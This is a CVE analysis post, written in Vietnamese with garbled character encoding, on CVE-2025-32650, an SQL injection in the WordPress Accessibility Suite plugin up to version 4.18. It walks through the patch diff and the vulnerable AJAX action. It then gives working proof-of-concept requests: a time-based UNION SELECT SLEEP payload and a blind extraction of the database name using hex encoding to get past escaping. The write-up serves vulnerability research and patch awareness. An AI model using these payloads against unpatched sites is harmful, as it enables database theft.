---
title: CVE-2025-32650 Analysis & POC
description: Security Vulnerability in WordPress Accessibility Suite Plugin.
date: 2025-09-26 10:36:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, sqli]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

L·ªó h·ªïng x·∫£y ra tr√™n plugin **Accessibility Suite** c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n **4.19**. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.

* **CVE ID**: [CVE-2025-32650](https://www.cve.org/CVERecord?id=CVE-2025-32650)
* **Product**: [WordPress Accessibility Suite Plugin](https://wordpress.org/plugins/online-accessibility/)
* **Vulnerability Type**: SQL Injection
* **Affected Versions**: <= 4.18
* **CVSS severity**: High (8.5)
* **Required Privilege**: Subscriber

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Accessibility Suite**:  v4.18(vul) v√† v4.19(fix)
* **diff tool**: **meld** ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version

## Analysis

·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho **input** v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng `prepare()` ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.

### Patch Diff

D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.
C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file **includes/classes/Helper.php**

```php
static function save_false_positive($scan_id, $issue_id){
    // other logic
    if(! is_admin()) {
        return '';
    }
    // other logic
    $list = json_decode(
        $wpdb->get_results($wpdb->prepare("SELECT list FROM  $table_name WHERE scan_id = $scan_id"))[0]->list // phpcs:ignore
    );
}
```

B·∫£n v√° ƒë√£ truy·ªÅn `$scan_id` nh∆∞ tham s·ªë v√†o c√¢u query. SQL injection ƒë∆∞·ª£c ph√≤ng ng·ª´a v√¨ bi·∫øn kh√¥ng ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o query n·ªØa.

```php
static function save_false_positive($scan_id, $issue_id){
    // other logic
    if(! is_admin()) {
        return '';
    }
    // other logic
    $scan_id = absint($scan_id); // Ensure scan_id is a positive integer
    
    if (!$scan_id) {
        return ["status" => "failed", "msg" => "Invalid scan ID"];
    }
    
    // Get list using properly prepared query
    $query = $wpdb->prepare(
        "SELECT list FROM %i WHERE scan_id = %d",
        $table_name,
        $scan_id
    );
    
    $result = $wpdb->get_results($query);
}
```

{{< figure src="patch_diff.png" caption="Patch diff" alt="patch diff" >}}

### How it work?

L·ªó h·ªïng n·∫±m trong h√†m tƒ©nh `save_false_positive` c·ªßa class `Helper` thu·ªôc file **includes/classes/Helper.php**. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a `save_false_positive` trong th∆∞ m·ª•c ch·ª©a plugin.

{{< figure src="search_1.png" caption="Search save_false_positive" alt="search save_false_positive" >}}

üëâ `save_false_positive` ƒë∆∞·ª£c `callback` c·ªßa action hook `wp_ajax_ONLINE_ADAv4/save_false_positive` g·ªçi.

Khi **POST** request ƒë∆∞·ª£c g·ª≠i ƒë·∫øn `/wp-admin/admin-ajax.php` v·ªõi `action`=`ONLINE_ADAv4/save_false_positive` callback ƒë∆∞·ª£c g·ªçi.
Trong request c·∫ßn 2 **POST** param `issue_id` v√† `scan_id`. N·∫øu kh√¥ng, ·ª©ng d·ª•ng s·∫Ω tr·∫£ v·ªÅ:

```json
{"status":"failed","msg":"Did not receive the scan ID or the issue ID"}
```

`save_false_positive` ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë `issue_id` v√† `scan_id`. C√°c ƒë·ªëi s·ªë n√†y s·∫Ω b·ªã escape b·ªüi [**magic quotes**](https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes) trong WordPress v√¨ l·∫•y tr·ª±c ti·∫øp t·ª´ **POST** request.

·ª®ng d·ª•ng check xem ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin kh√¥ng. N·∫øu kh√¥ng, tr·∫£ v·ªÅ chu·ªói r·ªóng.

```php
if(! is_admin()) {
    return '';
}
```

Sau ƒë√≥ c√°c ƒë·ªëi s·ªë tr·ª±c ti·∫øp truy·ªÅn v√†o c√¢u query ch·ª©a l·ªó h·ªïng SQLi r·ªìi th·ª±c thi.

## Exploit

### Detect SQLi

G·ª≠i **POST request** ch·ª©a payload SQLi. V√¨ ch·ªâ c·∫ßn l√† user c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin, n√™n ta t·∫°o user v·ªõi `role:subcriber` c√≥ **privilege th·∫•p nh·∫•t**.

Trong WordPress, user c√≥ role cao h∆°n s·∫Ω k·∫ø th·ª´a c·∫£ **privilege** role th·∫•p h∆°n. N√™n ch·ªâ c·∫ßn user `subcriber` g·ª≠i payload th√†nh c√¥ng th√¨ t·∫•t c·∫£ user c√≤n l·∫°i ƒë·ªÅu c√≥ th·ªÉ. ƒê√∫ng v·ªõi m√¥ t·∫£ c·ªßa CVE

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
...
Cookie: cookie_here

action=ONLINE_ADAv4/save_false_positive&issue_id=1&scan_id=1 UNION SELECT SLEEP(5)
```

Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh

```sql
SELECT list FROM  wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5)
```

{{< figure src="time_response.png" caption="Time response with SQLi payload" alt="time response with SQLi payload" >}}

üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi => payload ho·∫°t ƒë·ªông.

**C√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng**:

* **UNION**: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng v·ªõi truy v·∫•n tr∆∞·ªõc ƒë√≥.
* **Subquery**:

  * **Subquery trong m·ªánh ƒë·ªÅ WHERE**: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi `SLEEP()`.
  * **Subquery trong m·ªánh ƒë·ªÅ FROM**: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh.

{{< figure src="https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png" caption="SQL Execution Order Diagram" alt="SQL Execution Order Diagram" >}}

### Get First Letter of Database Name

ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ **dump ƒë∆∞·ª£c h·∫øt data** l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.

G·ª≠i request v·ªõi **SQLi payload**:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
...
Cookie: cookie_here

action=ONLINE_ADAv4/save_false_positive&issue_id=1&scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1)
```

S·ª≠ d·ª•ng `SUBSTRING()` ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa **database name**, `IF()` tr·∫£ v·ªÅ `SLEEP(5)` n·∫øu k√Ω t·ª± ƒë√≥ l√† `0x77`('w')

S·ª≠ d·ª•ng hex encoding `w` th√†nh `0x77` v√¨ nh∆∞ ph√¢n t√≠ch [·ªü tr√™n](#how-it-work), `scan_id` s·∫Ω b·ªã escape.

üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi => k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† `w`.

## Conclusion

L·ªó h·ªïng **CVE-2025-32650** trong plugin WordPress **Accessibility Suite** tr∆∞·ªõc phi√™n b·∫£n **4.19** xu·∫•t ph√°t t·ª´ vi·ªác tri·ªÉn khai kh√¥ng ƒë√∫ng h√†m `$wpdb->prepare()` d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.

B·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai ƒë√∫ng `$wpdb->prepare`, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.

**Key takeaways**:

* Lu√¥n s·ª≠ d·ª•ng `$wpdb->prepare()` khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection.
* Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[ WordPress Accessibility Suite Plugin <= 4.18 is vulnerable to SQL Injection ](https://wordpress.org/plugins/online-accessibility/)
